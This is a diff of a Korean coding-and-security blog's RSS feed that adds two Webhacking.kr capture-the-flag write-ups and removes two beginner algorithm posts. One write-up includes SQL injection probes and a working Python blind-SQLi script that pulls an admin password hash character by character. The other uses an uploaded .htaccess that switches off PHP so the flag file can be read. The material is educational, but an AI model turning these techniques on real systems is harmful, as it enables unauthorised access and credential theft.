@@ -9,8 +9,68 @@
     <atom:link href="https://lrtk-coder.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>Coding, Security, IT News 등 정리한 블로그</description>
-    <pubDate>Mon, 07 Jun 2021 06:54:43 GMT</pubDate>
+    <pubDate>Mon, 07 Jun 2021 09:04:12 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>Webhacking.kr Old - 28 Write Up</title>
+      <link>https://lrtk-coder.github.io/2021/06/07/Webhacking-kr-Old-28-Write-Up/</link>
+      <guid>https://lrtk-coder.github.io/2021/06/07/Webhacking-kr-Old-28-Write-Up/</guid>
+      <pubDate>Mon, 07 Jun 2021 00:02:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-28"><a href="#Old-28" class="headerlink" title="Old - 28"></a>Old - 28</h2><p><img src="/images/pasted-643.png"><br>파일 업로드 페이지가 나왔다.<br><br>Flag가 안 나올 것을 알지만, flag.php 파일을 클릭하여 출력해봤다.</p><p><img src="/images/pasted-644.png"><br>새 하얗다… 아무것도 출력이 안됐다.<br><br>아마도 PHP 코드 안에 flag가 있는데 PHP가 실행되어서 아무것도 나오지 않는 듯 하다..</p><p>“그렇다면, 웹쉘을 업로드하면 웹쉘이 작동될까?”라는 생각을 하고 웹쉘을 업로드하였다.</p><p><img src="/images/pasted-645.png"><br><img src="/images/pasted-646.png"><br>PHP가 실행되지 않고, 읽기 모드로 브라우저에 출력되었다.<br><br>flag.php는 실행되면서, 내가 올린 파일은 실행도 안된다는 것에 한탄을 하면서 flag.php의 php 비활성화 방법을 찾아봤다.</p><p>1시간이 넘는 시간 동안 인터넷에 검색과 내가 알고있는 방법을 동원해도 통하지 않아서, 결국 다른 사람의 풀이 참고하였다.<br><br>다른 사람들은 .htaccess를 통해 간단하게 php 비활성화시켜 flag.php를 확인할 수 있었다.</p><blockquote><p><a href="https://httpd.apache.org/docs/current/ko/howto/htaccess.html">아파치 투토리얼: .htaccess 파일 - Apache HTTP Server Version 2.4</a><br>.htaccess 파일 : 아파치 설정파일이며, 디렉토리 별로 설정을 변경할 수 있는 분산 설정 파일이다.</p></blockquote><blockquote><p><a href="https://www.php.net/manual/en/apache.configuration.php">PHP Manual: Runtime Configuration</a><br>공식 PHP 메뉴얼을 살펴보면 .htaccess파일의 php_flag 설정을 통해 php.ini 구성 설정을 재정의할 수 있다고 나와 있다.</p></blockquote><p><img src="/images/pasted-647.png"><br><img src="/images/pasted-648.png"><br>php_flag engine off의 내용을 가진 .htaccess를 업로드하여, flag.php를 실행하지 않고 그대로 읽을 수 있었다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/06/07/Webhacking-kr-Old-28-Write-Up/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Webhacking.kr Old - 22 Write Up</title>
+      <link>https://lrtk-coder.github.io/2021/06/06/Webhacking-kr-Old-22-Write-Up/</link>
+      <guid>https://lrtk-coder.github.io/2021/06/06/Webhacking-kr-Old-22-Write-Up/</guid>
+      <pubDate>Sun, 06 Jun 2021 22:35:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-22"><a href="#Old-22" class="headerlink" title="Old - 22"></a>Old - 22</h2><p><img src="/images/pasted-624.png"><br>Admin으로 로그인하는게 이번 문제의 미션이다.</p><p><img src="/images/pasted-625.png"><br>혹시 guest 계정도 있을 것을 같아서 guest/guest로 로그인 시도하니, Login Fail이 출력되었다.</p><p><img src="/images/pasted-627.png"><br>admin/admin으로 로그인을 시도하니, 이번 역시 Login Fail이 출력되었다.</p><p><img src="/images/pasted-628.png"><br><img src="/images/pasted-629.png"><br>이번엔 SQLi를 시도하니, 패스워드가 틀렸다고 출력되었다.</p><p><img src="/images/pasted-630.png"><br>False를 삽입하면 어떻게 되는지 궁금하여, <code>admin&#39; and 1=0#</code>를 넣어서 시도하였다.<br><br>True의 값과 다른 출력을 볼 수 있었다. 이것을 이용하여 Blind SQLi를 시도할 수 있을 것 같다.</p><p><img src="/images/pasted-631.png"><br><img src="/images/pasted-632.png"><br>로그인이 성공하면 어떤 결과가 나오는지 궁금하여, Join 페이지에 들어가서 lrtk/lrtk으로 계정을 만들었다.</p><p><img src="/images/pasted-633.png"><br>로그인을 해보니, 패스워드의 해시값이 출력됐다.<br><br>해당 해시의 길이가 32 글자로, lrtk 계정의 패스워드가 MD5로 해시화를 한 것으로 판단된다.</p><p><img src="/images/pasted-634.png"><br>Lrtk 계정의 패스워드인 lrtk을 MD5로 해시화를 진행하니 문제 페이지에서 출력된 해시와 틀린 값을 볼 수 있었다.<br><br>아마 salt를 넣어준 것으로 생각하였다.</p><p>해당 MD5를 복호화하려고 복호화 사이트들을 들어가서 넣어보니, 모두 DB에 저장이 안된 값이라는 출력만 볼 수 있었다.</p><p><img src="/images/pasted-635.png"><br>그래서 나는 salt값을 구하기 위해 python으로 hash값을 구하였다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, itertools, hashlib, pprint</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, cpu_count</span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;lrtk&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saltFront</span>(<span class="params">salts</span>):</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> salts:</span><br><span class="line">        salt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(item)):</span><br><span class="line">            salt += item[idx]</span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        md5.update((salt + text).encode())</span><br><span class="line">        md5Text = md5.hexdigest()</span><br><span class="line">        print(<span class="string">f&#x27;<span class="subst">&#123;md5Text&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;salt + text&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saltEnd</span>(<span class="params">salts</span>):</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> salts:</span><br><span class="line">        salt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(item)):</span><br><span class="line">            salt += item[idx]</span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        md5.update((text + salt).encode())</span><br><span class="line">        md5Text = md5.hexdigest()</span><br><span class="line">        print(<span class="string">f&#x27;<span class="subst">&#123;md5Text&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;text + salt&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cores = cpu_count()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>+<span class="number">1</span>):</span><br><span class="line">        salts = <span class="built_in">list</span>(itertools.permutations(<span class="built_in">list</span>(string.ascii_lowercase + string.punctuation), count))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">with</span> Pool(cores) <span class="keyword">as</span> p:</span><br><span class="line">            hashing1 = p.<span class="built_in">map</span>(saltFront, salts)</span><br><span class="line">            hashing2 = p.<span class="built_in">map</span>(saltEnd, salts)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-638.png"><br>나는 30분 정도 돌리고 있는데 시간이 너무 아까워서 다른 시도라도 해보자라는 생각에 guest/guest으로 계정을 만들고, guest의 해시를 복호화 사이트에 돌려보니 DB에 저장되어있었다.<br><br>코딩한 노력이 물거품이 되었다…..</p><p>Salt 값을 알았으니, admin의 hash를 구해서 복호화를 시키겠다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwPrint</span>(<span class="params">url:<span class="built_in">str</span></span>):</span></span><br><span class="line">    pw =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">32</span>+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> string.ascii_lowercase + string.digits:</span><br><span class="line">            data[<span class="string">&#x27;uuid&#x27;</span>] = <span class="string">f&quot;admin&#x27; and substr(pw, <span class="subst">&#123;idx&#125;</span>, 1)=&#x27;<span class="subst">&#123;s&#125;</span>&#x27;#&quot;</span></span><br><span class="line">            res = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Wrong password!&#x27;</span><span class="keyword">in</span> res.text:</span><br><span class="line">                pw += s</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        print(<span class="string">f&#x27;<span class="subst">&#123;idx&#125;</span>번째 완료 &gt;&gt;&gt;&#x27;</span>, pw)</span><br><span class="line">    print(<span class="string">&#x27;완료 &gt;&gt;&gt;&#x27;</span>, pw)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;https://webhacking.kr/challenge/bonus-2/index.php&#x27;</span></span><br><span class="line">    pwPrint(url)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-639.png"><br>해당 결과를 얻을 수 있었다.</p><p><img src="/images/pasted-640.png"><br>MD5를 복호화를 통해 admin의 비밀번호는 wow라는 것을 알 수 있었다.</p><p><img src="/images/pasted-642.png"><br>Admin으로 로그인을 하니, Flag를 획득할 수 있었다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/06/06/Webhacking-kr-Old-22-Write-Up/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>Programmers Level 1 - 키패드 누르기</title>
@@ -562,74 +622,6 @@
       
       
       <comments>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-2016%EB%85%84/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>Programmers Level 1 - 시저 암호</title>
-      <link>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%8B%9C%EC%A0%80-%EC%95%94%ED%98%B8/</link>
-      <guid>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%8B%9C%EC%A0%80-%EC%95%94%ED%98%B8/</guid>
-      <pubDate>Fri, 28 May 2021 15:10:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;시저-암호&quot;&gt;&lt;a href=&quot;#시저-암호&quot; class=&quot;headerlink&quot; title=&quot;시저 암호&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/12926&quot;&gt;시저 암</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="시저-암호"><a href="#시저-암호" class="headerlink" title="시저 암호"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12926">시저 암호</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>어떤 문장의 각 알파벳을 일정한 거리만큼 밀어서 다른 알파벳으로 바꾸는 암호화 방식을 시저 암호라고 합니다. 예를 들어 “AB”는 1만큼 밀면 “BC”가 되고, 3만큼 밀면 “DE”가 됩니다. “z”는 1만큼 밀면 “a”가 됩니다. 문자열 s와 거리 n을 입력받아 s를 n만큼 민 암호문을 만드는 함수, solution을 완성해 보세요.</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>공백은 아무리 밀어도 공백입니다.</li><li>s는 알파벳 소문자, 대문자, 공백으로만 이루어져 있습니다.</li><li>s의 길이는 8000이하입니다.</li><li>n은 1 이상, 25이하인 자연수입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><h4 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">indexSize</span>(<span class="params">idx:<span class="built_in">int</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> idx - <span class="number">26</span> <span class="keyword">if</span> idx &gt;= <span class="number">26</span> <span class="keyword">else</span> idx</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s:<span class="built_in">str</span>, n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    lowerList = <span class="built_in">list</span>(string.ascii_lowercase)</span><br><span class="line">    s = <span class="built_in">list</span>(s)</span><br><span class="line">    </span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i.isupper():</span><br><span class="line">            idx = indexSize(lowerList.index(i.lower()) + n)</span><br><span class="line">            result += lowerList[idx].upper()</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">elif</span> i.islower():</span><br><span class="line">            idx = indexSize(lowerList.index(i) + n)</span><br><span class="line">            result += lowerList[idx]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += i</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>이 방법은 소문자 알파벳의 리스트를 생성하여, 인덱스를 n만큼 증가시켜서 출력하는 풀이이다.</p><h4 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s:<span class="built_in">str</span>, n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    s = <span class="built_in">list</span>(s)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> s[i].isupper():</span><br><span class="line">            s[i] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(s[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + n) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">elif</span> s[i].islower():</span><br><span class="line">            s[i] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(s[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + n) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(s)</span><br></pre></td></tr></table></figure><p>아스키코드를 이용한 방법이다.<br><br>방법1에선 26을 넘어가는 인덱스는 조건문을 이용하여, 인덱스 - 26로 하여 크기를 조정해줬는데 방법2에선 <code>%26</code>를 이용하여 조정하였다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
-      
-      
-      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
-      
-      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
-      
-      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%8B%9C%EC%A0%80-%EC%95%94%ED%98%B8/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>Programmers Level 1 - 이상한 문자 만들기</title>
-      <link>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%9D%B4%EC%83%81%ED%95%9C-%EB%AC%B8%EC%9E%90-%EB%A7%8C%EB%93%A4%EA%B8%B0/</link>
-      <guid>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%9D%B4%EC%83%81%ED%95%9C-%EB%AC%B8%EC%9E%90-%EB%A7%8C%EB%93%A4%EA%B8%B0/</guid>
-      <pubDate>Fri, 28 May 2021 01:26:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;이상한-문자-만들기&quot;&gt;&lt;a href=&quot;#이상한-문자-만들기&quot; class=&quot;headerlink&quot; title=&quot;이상한 문자 만들기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/less</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="이상한-문자-만들기"><a href="#이상한-문자-만들기" class="headerlink" title="이상한 문자 만들기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12930">이상한 문자 만들기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>문자열 s는 한 개 이상의 단어로 구성되어 있습니다. 각 단어는 하나 이상의 공백문자로 구분되어 있습니다. 각 단어의 짝수번째 알파벳은 대문자로, 홀수번째 알파벳은 소문자로 바꾼 문자열을 리턴하는 함수, solution을 완성하세요.</p><h2 id="제한-사항"><a href="#제한-사항" class="headerlink" title="제한 사항"></a>제한 사항</h2><ul><li>문자열 전체의 짝/홀수 인덱스가 아니라, 단어(공백을 기준)별로 짝/홀수 인덱스를 판단해야합니다.</li><li>첫 번째 글자는 0번째 인덱스로 보아 짝수번째 알파벳으로 처리해야 합니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s:<span class="built_in">str</span></span>):</span></span><br><span class="line">    s = s.lower().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        i = <span class="built_in">list</span>(i)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(i), <span class="number">2</span>):</span><br><span class="line">            i[j] = i[j].upper()</span><br><span class="line"></span><br><span class="line">        result.append(<span class="string">&#x27;&#x27;</span>.join(i))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(result)</span><br></pre></td></tr></table></figure><p>나는 문자열을 소문자로 변경 후 띄어쓰기 기준으로 나누어 리스트로 만들었다.<br><br>이때 중요한 것은 나눠진 부분은 띄어쓰기로 구분하였다.<br><br>E.g.) <code>aa aa</code> -&gt; <code>[&#39;aa&#39;, &#39; &#39;, &#39;aa&#39;]</code></p><p>그리고 0부터 2씩 증가시켜서 알파벳을 대문자로 변경하였다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
-      
-      
-      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
-      
-      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
-      
-      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%9D%B4%EC%83%81%ED%95%9C-%EB%AC%B8%EC%9E%90-%EB%A7%8C%EB%93%A4%EA%B8%B0/#disqus_thread</comments>
       
     </item>
     
